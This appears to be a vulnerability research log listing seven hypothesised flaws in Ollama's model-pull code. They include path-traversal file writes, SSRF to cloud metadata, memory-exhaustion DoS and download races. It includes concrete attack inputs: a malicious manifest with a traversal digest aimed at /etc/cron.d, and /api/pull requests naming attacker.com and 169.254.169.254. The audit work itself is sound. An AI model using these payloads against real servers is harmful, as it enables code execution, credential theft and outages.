# Round 1 Hypotheses — Backward Reasoner

Reasoning model: Pre-Mortem / Backward Causal (start from worst-case outcome, trace back to cause)

## PH-01: pullWithTransfer digest path traversal → arbitrary file write as ollama user (CRITICAL)

**Outcome imagined**: Attacker plants a file outside `$OLLAMA_MODELS/blobs/` (e.g., `/etc/cron.d/0pwn.tmp`, `~/.ssh/authorized_keys.tmp`) containing attacker-controlled bytes.

**Backward trace**:
- `os.Rename(tmp, dest)` at `transfer/download.go:266` writes to `dest`
- `dest = filepath.Join(d.destDir, digestToPath(blob.Digest))`
- `digestToPath("sha256:../../../etc/cron.d/0pwn")` → `"sha256-../../../etc/cron.d/0pwn"`
- `filepath.Join("/home/user/.ollama/models/blobs", "sha256-../../../etc/cron.d/0pwn")` → `/etc/cron.d/0pwn`
- `blob.Digest` is set from `layer.Digest` in `pullWithTransfer` at `images.go:724-726`
- `layer.Digest` comes from `manifest.Layer` deserialized from registry manifest JSON
- No call to `manifest.BlobsPath` in `pullWithTransfer` path
- Dispatch to `pullWithTransfer` triggered by `hasTensorLayers == true`
- `hasTensorLayers` is true when ANY layer has `MediaType == "application/vnd.ollama.image.tensor"`
- An attacker-controlled registry adds a single tiny tensor layer + a malicious config layer with traversal digest

**Attack input**: `POST /api/pull {"name":"attacker.com/evil/model:latest"}` where the manifest at `attacker.com` contains:
```json
{"layers": [
  {"mediaType": "application/vnd.ollama.image.tensor", "digest": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1111", "size": 1},
  {"mediaType": "application/vnd.ollama.image.model", "digest": "sha256:../../../etc/cron.d/0pwn", "size": 999999999}
]}
```

**Critical precondition**: `blob.Size >= resumeThreshold (64MB)` → `.tmp` file persists even when hash mismatch. With `size < 64MB`, `.tmp` is removed on mismatch. Attacker sets `size >= 64MB` and streams arbitrary bytes.

**VALIDATED**: Code path confirmed at `server/images.go:721-773` and `x/imagegen/transfer/transfer.go:165` and `x/imagegen/transfer/download.go:213-266`. `digestToPath` has NO validation. `os.MkdirAll` creates directories. Hash mismatch does not remove `.tmp` for large blobs.

**Severity**: CRITICAL — arbitrary file write as ollama service user; on Linux cron/profile.d drop-in = RCE.

---

## PH-02: pullWithTransfer size-only cache-hit → model substitution (HIGH)

**Outcome imagined**: Malicious model weights served to inference engine even though ollama believes it already has the legitimate model.

**Backward trace**:
- `downloader.download` at `transfer/download.go:56-68` checks `fi.Size() == b.Size` for cache hit
- No hash computation on the cached file
- Attacker can pre-stage `$OLLAMA_MODELS/blobs/sha256-<digest>` with malicious GGUF of the correct file size
- Pre-staging vectors: (a) another `ollama pull` that was interrupted leaving wrong bytes, (b) shared NFS mount writable by co-tenant, (c) prior path-traversal write via PH-01, (d) compromised blob from a separate registry
- Next `ollama pull` skips download, serves malicious file as model
- Model bytes flow into `ggml.Decode` → llama.cpp cgo → arbitrary code via crafted GGUF tensors

**Attack input**: Write a file of correct size to the expected blob path, then trigger `ollama pull` of a legitimate model.

**Precondition**: Write access to blob store directory (co-tenant, prior attack, or shared mount).

**VALIDATED**: `transfer/download.go:58` has no hash check. Legacy path `downloadBlob` at `server/download.go:478-491` also lacks hash on cache hit. Neither path re-hashes existing files.

**Severity**: HIGH — model substitution leading to crafted GGUF consumption.

---

## PH-03: SSRF via /api/pull registry host — IMDS/metadata endpoint access (HIGH)

**Outcome imagined**: Attacker reads AWS/GCP/Azure instance metadata credentials from the Ollama server's cloud environment.

**Backward trace**:
- Error message in `PullModel` at `images.go:622`: `"pull model manifest: %s"` echoes registry HTTP response
- `pullModelManifest` calls `makeRequestWithRetry` → `makeRequest` builds URL from `n.BaseURL()`
- `n.BaseURL()` builds `https://<user-supplied-host>/v2/...`
- No host allowlist in `PullModel`, `pullModelManifest`, or `makeRequest`
- Model name host validated only by `isValidPart` (alphanumerics + `_-.:`) — permits IP addresses
- `POST /api/pull {"name":"169.254.169.254/library/x:latest"}` → GET `https://169.254.169.254/v2/library/x/manifests/latest`
- If IMDS responds on port 443 (unlikely) or with HTTP on the redirect, the response body appears in error messages
- More reliably: `POST /api/pull {"name":"169.254.169.254:80/library/x:latest"}` without TLS check (but scheme defaults to https for non-default hosts)
- Alternative: `regOpts.Insecure=true` from request `{"insecure": true}` → HTTP allowed → reliable IMDS probe

**Attack input**: `POST /api/pull {"name":"169.254.169.254/x:latest","insecure":true}` via DNS rebind or localhost access.

**VALIDATED**: `server/images.go:615` checks `n.ProtocolScheme == "http"` but `isValidPart` permits IP addresses including 169.254.x.x. With `Insecure:true` from request body, HTTP is allowed. `routes.go:953` binds `req.Insecure` to `regOpts.Insecure`.

**Severity**: HIGH — SSRF to IMDS in cloud environments; also reachable on any internal network endpoint.

---

## PH-04: pullModelManifest io.ReadAll memory exhaustion DoS (HIGH)

**Outcome imagined**: Ollama server OOM-killed after receiving a pull request targeting a malicious registry.

**Backward trace**:
- `pullModelManifest` at `images.go:864`: `data, err := io.ReadAll(resp.Body)` — no `io.LimitReader`
- `resp.Body` is the HTTP response from the registry, fully attacker-controlled
- Registry serves multi-GB manifest body (valid HTTP 200 with Transfer-Encoding: chunked)
- Go runtime allocates `data` slice incrementally; with 2GB body → 2GB heap allocation
- Server OOM → SIGKILL → all active inference sessions dropped

**Attack input**: `POST /api/pull {"name":"attacker.com/evil:latest"}` where `attacker.com` serves `GET /v2/.../manifests/latest` with an infinite or very large response body.

**Related surface**: `server/auth.go:81` `getAuthorizationToken` has the same `io.ReadAll` with no cap on the token response.

**VALIDATED**: `server/images.go:864` confirmed no `io.LimitReader`. `server/auth.go:81` confirmed no cap. Both are reachable from a single pull request.

**Severity**: HIGH — unauthenticated OOM DoS via malicious registry; exploitable via SSRF even from restricted networks.

---

## PH-05: HTTP 206 Content-Range not validated — partial corrupt write bypasses hash (MEDIUM-HIGH)

**Outcome imagined**: On-disk blob has wrong bytes at known offsets despite streaming hash appearing to pass.

**Backward trace**:
- `downloadChunk` at `server/download.go:331-389` sends `Range: bytes=X-Y`
- Response is read into `io.NewOffsetWriter(file, part.StartsAt())`
- `resp.StatusCode` is never checked to be 206; a 200 response would dump the entire blob into this part's slot (for parts[0] this is bytes[0..partSize-1] which is correct; for parts[N>0] it writes first `partSize` bytes of the full blob into the wrong offset)
- `Content-Range` header in response is never compared to `bytes=X-Y` that was requested
- For a malicious CDN that sends `bytes=0-X` regardless of the `Range:` header requested: part 0 gets correct bytes, all other parts get wrong bytes at their offsets
- The streaming hasher (if applicable) would eventually detect mismatch — BUT in the pre-`2aee6c17` merged tree (current main), `verifyBlob` is the second line
- With 200-response: `io.CopyN(w, ..., part.Size-part.Completed.Load())` reads exactly `part.Size` bytes regardless; those bytes are the FIRST `part.Size` bytes of the full blob for every part N>0 → systematic data corruption

**VALIDATED**: `server/download.go:334` sets Range header; lines 340-351 read response with no StatusCode/Content-Range check. `io.CopyN` at line 345 terminates when `part.Size-part.Completed.Load()` bytes are read — correct for 206, dangerous for 200.

**Severity**: MEDIUM-HIGH — partial corruption from a MITM/malicious CDN; caught by end-to-end hash if no race, but see PH-06.

---

## PH-06: Slow-retry race on blobDownload leaves stray write after hash check (HIGH)

**Outcome imagined**: Final on-disk blob contains attacker bytes at specific offsets even after streaming hash validated the download.

**Backward trace** (from KB Analysis section, Finding 3 of 2aee6c17):
- `errPartStalled` triggers `try--` (indefinite retry) in the retry loop
- A new `downloadChunkToDisk` starts from `part.StartsAt()` = `part.Offset` (not from the stalled position in current code since StartsAt uses Completed.Load which is reset)
- The abandoned goroutine from the previous attempt may still have an in-flight `w.Write` to the overlapping offset range
- If the hasher reads offset range before the late-arriving write, hash passes; then the stray write lands and corrupts the just-renamed final blob
- Current tree: `blobDownload.run` at `server/download.go:283-307` uses `errgroup` which signals cancellation; the fetcher goroutine sees `ctx.Done`; but `resp.Body.Read(buf)` may complete one final buffered read before the goroutine exits
- After `g.Wait()` at line 309, the file is closed and renamed; a goroutine that ran past its deadline could still have a pending `w.Write` that lands after the rename

**VALIDATED** (partial): Code at `server/download.go:283-307` confirms retry loop exists. Current tree uses `part.StartsAt()` for offset writer which is `part.Offset + part.Completed.Load()`. The race requires: (a) errgroup context cancels the goroutine, (b) goroutine has buffered data, (c) pwrite lands after hash but before rename. Severity is constrained to attacker-controlled origin or MITM on insecure registry.

**Severity**: HIGH (constrained to MITM + win goroutine race); novel interaction.

---

## PH-07: fixBlobs path traversal via symlink in blobs directory (MEDIUM)

**Outcome imagined**: `fixBlobs` renames files it should not touch, or follows a symlink to rename a file outside `$OLLAMA_MODELS/blobs/`.

**Backward trace**:
- `fixBlobs` at `server/fixblobs.go:11` uses `filepath.Walk(dir, ...)` 
- `filepath.Walk` follows symlinks in directory entries (for intermediate components) but uses `os.Lstat` for the visited path itself
- If a blob file is a symlink to another file (pre-staged by attacker), `filepath.Walk` visits the symlink's name; `filepath.Base(path)` returns the symlink's name; if it matches `sha256:XXXX`, `os.Rename(path, newPath)` renames the SYMLINK ITSELF (not the target) to a new name in the same directory
- This is relatively benign (symlink gets renamed)
- More interesting: if a subdirectory entry is a symlink to another directory, `filepath.Walk` descends into it; files inside the symlinked-to directory matching `sha256:XXXX` get renamed outside their original directory

**VALIDATED (partial)**: `filepath.Walk` traverses symlinked directories. This requires prior write access to plant a symlink in `$OLLAMA_MODELS/blobs/`, which compounds with PH-01. Low standalone impact; medium when chained.

**Severity**: MEDIUM — rename-primitive via symlink in blobs dir when chained with prior write access.
